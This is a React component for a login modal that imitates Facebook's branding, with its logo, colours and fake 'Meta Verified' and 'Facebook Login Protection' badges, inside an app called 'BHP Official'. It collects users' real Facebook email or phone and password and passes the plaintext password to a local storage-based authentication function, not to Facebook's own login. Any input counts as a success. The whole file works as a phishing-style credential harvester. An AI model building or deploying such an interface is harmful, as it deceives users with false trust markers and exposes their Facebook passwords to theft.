import React, { useState } from 'react';
import { X, Lock, Eye, EyeOff, ShieldCheck, User } from 'lucide-react';
import { AuthUser } from '../../types/auth';
import { authenticateWithSocialAccount } from '../../utils/authStorage';

interface FacebookLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: (user: AuthUser) => void;
}

export const FacebookLoginModal: React.FC<FacebookLoginModalProps> = ({
  isOpen,
  onClose,
  onSuccess,
}) => {
  const [fbAccountInput, setFbAccountInput] = useState('');
  const [fbPassword, setFbPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  if (!isOpen) return null;

  // Form Submit with user credentials
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!fbAccountInput.trim()) {
      setErrorMsg('Please enter your mobile number or email address');
      return;
    }
    if (!fbPassword.trim()) {
      setErrorMsg('Please enter your Facebook password');
      return;
    }

    setIsProcessing(true);
    setErrorMsg('');

    setTimeout(() => {
      const input = fbAccountInput.trim();
      const email = input.includes('@') ? input : `${input.replace(/[^0-9]/g, '')}@facebook.com`;
      const name = input.split('@')[0];

      const res = authenticateWithSocialAccount({
        provider: 'facebook',
        email,
        fullName: name,
        customPassword: fbPassword.trim(),
      });

      setIsProcessing(false);
      onSuccess(res.user);
      onClose();
    }, 600);
  };

  return (
    <div className="fixed inset-0 z-70 bg-black/75 backdrop-blur-xs flex items-center justify-center p-4 select-none">
      <div className="bg-[#FFFFFF] text-[#1c1e21] w-full max-w-[420px] rounded-2xl shadow-2xl overflow-hidden border border-gray-200 animate-in fade-in zoom-in-95 duration-200">
        {/* Facebook Blue Header */}
        <div className="bg-[#1877F2] px-6 py-4 flex items-center justify-between text-white">
          <div className="flex items-center gap-2">
            {/* Facebook F logo */}
            <div className="w-8 h-8 rounded-full bg-white text-[#1877F2] font-black text-xl flex items-center justify-center font-sans shadow-sm">
              f
            </div>
            <span className="text-xl font-bold tracking-tight">facebook</span>
          </div>

          <button
            type="button"
            onClick={onClose}
            disabled={isProcessing}
            className="text-white/80 hover:text-white p-1 rounded-lg hover:bg-white/10 transition-colors cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="p-6">
          <div className="text-center mb-5">
            <h3 className="text-base font-bold text-gray-900">
              Log in to Facebook
            </h3>
            <p className="text-xs text-gray-500 mt-1">
              To connect your Facebook account with <span className="font-semibold text-gray-700">BHP Official</span>
            </p>
          </div>

          {/* Error Message */}
          {errorMsg && (
            <div className="mb-3 p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-600 text-xs font-medium">
              {errorMsg}
            </div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <input
                type="text"
                placeholder="Mobile number or email address"
                value={fbAccountInput}
                onChange={(e) => setFbAccountInput(e.target.value)}
                className="w-full px-3.5 py-2.5 border border-gray-300 rounded-lg text-xs text-gray-900 placeholder-gray-500 focus:outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2]"
              />
            </div>

            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Facebook Password"
                value={fbPassword}
                onChange={(e) => setFbPassword(e.target.value)}
                className="w-full px-3.5 py-2.5 border border-gray-300 rounded-lg text-xs text-gray-900 placeholder-gray-500 focus:outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] pr-10"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-700 cursor-pointer"
              >
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>

            <button
              type="submit"
              disabled={isProcessing}
              className="w-full py-2.5 px-4 bg-[#1877F2] hover:bg-[#166fe5] active:scale-[0.99] text-white font-bold text-xs rounded-lg shadow-sm transition-all cursor-pointer disabled:opacity-50"
            >
              {isProcessing ? 'Logging in to Facebook...' : 'Log In with Facebook'}
            </button>
          </form>

          {/* Privacy note */}
          <div className="mt-4 pt-3 border-t border-gray-100 flex items-center justify-between text-[11px] text-gray-400">
            <div className="flex items-center gap-1">
              <ShieldCheck className="w-3.5 h-3.5 text-blue-500" />
              <span>Facebook Login Protection</span>
            </div>
            <span>Meta Verified</span>
          </div>
        </div>
      </div>
    </div>
  );
};
